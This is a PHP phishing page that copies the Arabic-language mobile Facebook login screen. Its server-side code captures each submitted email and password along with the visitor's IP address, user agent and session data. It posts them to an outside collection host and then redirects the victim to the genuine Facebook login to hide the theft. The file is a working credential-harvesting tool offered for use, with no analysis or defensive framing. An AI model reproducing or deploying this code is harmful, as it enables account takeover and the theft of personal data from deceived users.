<?php
session_start();
error_reporting(0);


//$_SESSION["users"] = "1";

	if(isset($_POST['login'])){
		
		if(empty($_POST['email'])){
			
			echo'<div class="_5yd0 _2ph- _5yd1" style="" data-sigil="m_login_notice">يرجى إدخال البريد الإلكتروني الخاصة بك. &rlm;&rlm;</div>';
		}else{
			
			if(empty($_POST['pass'])){
				
				echo'<div class="_5yd0 _2ph- _5yd1" style="" data-sigil="m_login_notice">يرجى إدخال كلمة السر الخاصة بك. </div>';
				
			}else{
				
			
				
							//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $date;
$data['s'] = $_SESSION;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = ($_SERVER['HTTP_USER_AGENT']);
//$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);


sendPost('http://saveinfo.aba.ae/Facebook/saveface.php/',$data);


//---- end request----------------


$url = "https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=111";

header("LOCATION: ".$url."");
				
				
			}
			
		}
			
			
		}
			
	
	
	?>



<!DOCTYPE html><html><head><title>فيسبوك - تسجيل الدخول أو الاشتراك</title><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" /><link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" /><link type="text/css" rel="stylesheet" href="../css/cUwDtFOUx9L.css" data-bootloader-hash="+tzXZ" crossorigin="anonymous" /><link type="text/css" rel="stylesheet" href="../css/Dj2wEyWbtLv.css" data-bootloader-hash="K63Za" crossorigin="anonymous" />



<meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" /><meta name="description" content="&#x64a;&#x645;&#x643;&#x646;&#x643; &#x625;&#x646;&#x634;&#x627;&#x621; &#x62d;&#x633;&#x627;&#x628; &#x623;&#x648; &#x62a;&#x633;&#x62c;&#x64a;&#x644; &#x627;&#x644;&#x62f;&#x62e;&#x648;&#x644; &#x625;&#x644;&#x649; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643; &#x648;&#x627;&#x644;&#x62a;&#x648;&#x627;&#x635;&#x644; &#x645;&#x639; &#x627;&#x644;&#x623;&#x635;&#x62f;&#x642;&#x627;&#x621; &#x648;&#x623;&#x641;&#x631;&#x627;&#x62f; &#x627;&#x644;&#x639;&#x627;&#x626;&#x644;&#x629; &#x648;&#x627;&#x644;&#x623;&#x634;&#x62e;&#x627;&#x635; &#x627;&#x644;&#x622;&#x62e;&#x631;&#x64a;&#x646; &#x627;&#x644;&#x630;&#x64a;&#x646; &#x62a;&#x639;&#x631;&#x641;&#x647;&#x645;. &#x627;&#x633;&#x62a;&#x645;&#x62a;&#x639; &#x628;&#x645;&#x634;&#x627;&#x631;&#x643;&#x629; &#x627;&#x644;&#x635;&#x648;&#x631; &#x648;&#x645;&#x642;&#x627;&#x637;&#x639; &#x627;&#x644;&#x641;&#x64a;&#x62f;&#x64a;&#x648; &#x648;&#x625;&#x631;&#x633;&#x627;&#x644;..." /><link rel="canonical" href="https://www.facebook.com/" /></head><body tabindex="0" class="touch x1 rtl _fzu _50-3 iframe acw"><script id="u_0_d">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script><div id="viewport" data-kaios-focus-transparent="1"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">فيسبوك</h1><div id="page" class=""><div class="_129_" id="header-notices"></div><div class="_7om2 _52we _52z5" id="header"><div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="../login/?refid=8"><i class="img sp_gDRqieMQ6G1 sx_02886b"><u>facebook</u></i></a></div></div>

<div class="acy apm abb" data-sigil="marea"><span class="mfsm">يجب عليك تسجيل الدخول أولاً.</span></div>


<div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane"><div class="_7om2"><div class="_4g34" id="u_0_0"><div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice"><div class="_52jd"></div></div><div class="aclb _4-4l"><div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div><div class="_5rut"><div></div><form method="post" action="" class="mobile-login-form _5spm" id="login_form" novalidate="1"><input type="hidden" name="lsd" value="AVpSFLbU" autocomplete="off" /><input type="hidden" name="jazoest" value="2675" autocomplete="off" /><input type="hidden" name="m_ts" value="1560848133" /><input type="hidden" name="li" value="BacIXZ6miNKs-9tRiJyKaHDG" /><input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" /><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" /><div id="user_info_container" data-sigil="user_info_after_failure_element"></div><div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div><div id="otp_retrieve_desc_container"></div><div class="_56be _5sob"><div class="_55wo _55x2 _56bf"><div id="email_input_container"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="email" placeholder="&#x631;&#x642;&#x645; &#x627;&#x644;&#x647;&#x627;&#x62a;&#x641; &#x627;&#x644;&#x645;&#x62d;&#x645;&#x648;&#x644; &#x623;&#x648; &#x627;&#x644;&#x628;&#x631;&#x64a;&#x62f; &#x627;&#x644;&#x625;&#x644;&#x643;&#x62a;&#x631;&#x648;&#x646;&#x64a;" value="" type="text" data-sigil="m_login_email" /></div><div><div class="_1upc _mg8" data-sigil="m_login_password"><div class="_7om2"><div class="_4g34 _5i2i _52we"><div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="pass" placeholder="&#x643;&#x644;&#x645;&#x629; &#x627;&#x644;&#x633;&#x631;" type="password" data-sigil="password-plain-text-toggle-input" /></div></div><div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_1"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">إخفاء</span><span class="mfss" id="u_0_3">إظهار</span></a></div></div></div></div></div></div></div></div><div class="_2pie" style="text-align:center;"><div id="u_0_4" data-sigil="login_password_step_element"><button type="submit" value="&#x62a;&#x633;&#x62c;&#x64a;&#x644; &#x627;&#x644;&#x62f;&#x62e;&#x648;&#x644;" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button"><span class="_55sr">تسجيل الدخول</span></button></div><div class="_7eif" id="oauth_login_button_container" style="display:none"></div><div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div><input type="hidden" name="prefill_contact_point" id="prefill_contact_point" value="ms.alali5&#064;mail.ru" /><input type="hidden" name="prefill_source" id="prefill_source" value="identified_user" /><input type="hidden" name="prefill_type" id="prefill_type" value="contact_point" /><input type="hidden" name="first_prefill_source" id="first_prefill_source" value="identified_user" /><input type="hidden" name="first_prefill_type" id="first_prefill_type" value="contact_point" /><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="true" /><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" /><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" /><div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript></form><div><div class="_43mg"><span class="_43mh">أو</span></div><div class="_52jj _5t3b" id="u_0_6"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="#" tabindex="0" data-sigil="m_reg_button">إنشاء حساب جديد</a></div></div><div><div class="other-links"><ul class="_5pkb _55wp"><li><span class="mfss fcg"><a tabindex="0" href="../login/?refid=8" id="forgot-password-link">هل نسيت كلمة السر؟</a><span aria-hidden="true"> · </span><a href="../login/?refid=8" id="help-link" class="sec">مركز المساعدة</a></span></li></ul></div></div></div><div></div></div></div></div><div></div><span><img src="" width="0" height="0" style="display:none" /></span><div class="_55wr _5ui2"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">العربية</span><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="en_US" data-sigil="change_language">English (US)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="fa_IR" data-sigil="change_language">فارسی</a></span></div><div class="_3ztc"><span class="_52jc"><a href="" data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="" data-locale="cb_IQ" data-sigil="change_language">کوردیی ناوەندی</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="tr_TR" data-sigil="change_language">Türkçe</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="es_LA" data-sigil="change_language">Español</a></span></div><a href="#"><div class="_3j87 _1rrd _3ztd" aria-label="&#x642;&#x627;&#x626;&#x645;&#x629; &#x643;&#x627;&#x645;&#x644;&#x629; &#x628;&#x627;&#x644;&#x644;&#x63a;&#x627;&#x62a;" data-sigil="more_language"><i class="img sp_gDRqieMQ6G1 sx_90c73f"></i></div></a></div></div></div><div class="_5ui4"><span class="mfss fcg">Facebook ‏©‏‏2019‏</span></div></div></div></div><div class=""></div><div class="viewportArea _2v9s" style="display:none" id="u_0_7" data-sigil="marea"><div class="_5vsg" id="u_0_8"></div><div class="_5vsh" id="u_0_9"></div><div class="_5v5d fcg"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>جارٍ التحميل...</div></div><div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"><div class="container"><div class="image"></div><div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">المحاولة مرة أخرى</a></div></div></div></div><div id="static_templates"><div class="mDialog" id="modalDialog" style="display:none"><div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"><div class="_7om2 _52we"><div class="_5s61"><div class="_52z7"><button type="submit" value="&#x625;&#x644;&#x63a;&#x627;&#x621;" class="cancelButton btn btnD bgb mfss touchable" id="u_0_b" data-sigil="dialog-cancel-button">إلغاء</button><button type="submit" value="&#x639;&#x648;&#x62f;&#x629;" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="&#x639;&#x648;&#x62f;&#x629;" id="u_0_c" data-sigil="dialog-back-button"><i class="img sp_gDRqieMQ6G1 sx_e23ed3" style="margin-top: 2px;"></i></button></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">جارٍ التحميل...</div></div></div><div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div></div></div><div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg" id="dialogSpinner"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_a" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>جارٍ التحميل...</div></div></div><script id="u_0_i" crossorigin="anonymous" src="" data-bootloader-hash="k5ST5"></script>


</body></html>